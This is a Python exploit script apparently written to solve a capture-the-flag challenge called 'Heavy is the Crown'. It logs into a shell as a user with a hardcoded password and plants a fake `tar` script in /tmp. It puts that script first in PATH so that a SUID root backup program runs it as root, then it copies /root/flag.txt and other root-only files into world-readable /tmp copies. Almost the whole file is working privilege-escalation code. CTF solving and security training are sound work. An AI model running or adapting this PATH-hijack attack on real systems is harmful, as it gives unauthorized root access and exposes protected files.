"""Heavy is the Crown (500): SUID root charon-backup PATH-hijacks `tar`.

charon-backup runs, as root, the single string:
    tar czf /var/backups/charon-ops.tgz -C /opt ops 2>/dev/null
It goes through /bin/sh, so `tar` is resolved from the inherited PATH.
Put a fake `tar` earlier in PATH and it runs as root.
"""
import asyncio
import os
import re
import sys
import uuid

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import find_flags as ff  # noqa: E402
from find_flags import Shell  # noqa: E402

MORT_PW = "princess2015"

# The fake `tar` that root will execute. Reads /root, drops world-readable copies.
FAKE_TAR = r"""#!/bin/sh
cp /root/flag.txt /tmp/rflag.txt 2>/dev/null
chmod 777 /tmp/rflag.txt 2>/dev/null
cp /root/kingmaker.txt /tmp/rking.txt 2>/dev/null
chmod 777 /tmp/rking.txt 2>/dev/null
id > /tmp/rwho.txt 2>/dev/null
chmod 777 /tmp/rwho.txt 2>/dev/null
cp /opt/ops/leverage.txt /tmp/leverage.txt 2>/dev/null
chmod 777 /tmp/leverage.txt 2>/dev/null
exit 0
"""


def ff_clean(s):
    s = re.sub(r"\x1b\[[0-9;?]*[a-zA-Z]", "", s)
    return s.replace("\x1b[?2004l", "").replace("\x1b[?2004h", "").strip()


async def wait_for(sh, needle, timeout=45.0):
    buf, loop = "", asyncio.get_event_loop()
    end = loop.time() + timeout
    while loop.time() < end:
        buf += await sh.read(1.5)
        if needle in buf:
            return True, buf
    return False, buf


async def cmd(sh, command, timeout=45.0):
    tag = "Z" + uuid.uuid4().hex[:7]
    await sh.send(command)
    await asyncio.sleep(0.3)
    await sh.send(f"echo {tag}D")
    ok, buf = await wait_for(sh, f"{tag}D", timeout)
    return ff_clean("\n".join(l for l in buf.splitlines() if tag not in l)), ok


async def body(sh):
    await sh.read(5.0)
    await sh.send("su - mort1cia")
    got, _ = await wait_for(sh, "Password:", 25.0)
    if got:
        await sh.send(MORT_PW)
        await asyncio.sleep(3.0)
        await sh.read(2.0)
    print("as:", (await cmd(sh, "id"))[0][:110], flush=True)

    print("\n### 1. plant a fake `tar`", flush=True)
    res, _ = await cmd(sh, "mkdir -p /tmp/mortbin && echo ok", 20)
    print(res, flush=True)

    b64 = base64.b64encode(FAKE_TAR.encode()).decode()
    res, ok1 = await cmd(sh, f"echo {b64} | base64 -d > /tmp/mortbin/tar", 25)
    res, ok2 = await cmd(sh, "chmod 777 /tmp/mortbin/tar && cat /tmp/mortbin/tar", 20)
    print(res[:400], flush=True)

    print("\n### 2. put it first in PATH and run the SUID binary", flush=True)
    res, _ = await cmd(sh, "export PATH=/tmp/mortbin:$PATH; hash -r; which tar; "
                          "rm -f /tmp/rflag.txt /tmp/rwho.txt /tmp/rking.txt; "
                          "charon-backup 2>&1", 40)
    print(res[:600], flush=True)

    print("\n### 3. read what root dumped", flush=True)
    for label, f in [("who", "/tmp/rwho.txt"), ("flag", "/tmp/rflag.txt"),
                     ("kingmaker", "/tmp/rking.txt"), ("leverage", "/tmp/leverage.txt")]:
        res, _ = await cmd(sh, f"echo '--- {f} ---'; cat {f} 2>&1", 25)
        print(res[:700], flush=True)

    print("\n### 4. confirm it is really uid 0", flush=True)
    res, _ = await cmd(sh, "id; od -c /tmp/rflag.txt 2>/dev/null | head -4", 25)
    print(res[:500], flush=True)
    return True


import base64  # noqa: E402  (kept low so the module docstring stays readable)


async def main():
    for attempt in range(1, 4):
        try:
            async with Shell() as sh:
                if await body(sh):
                    return
                return
        except Exception as e:
            print(f"[outer {attempt}] {type(e).__name__}: {e}", flush=True)
        await asyncio.sleep(6)


asyncio.run(main())
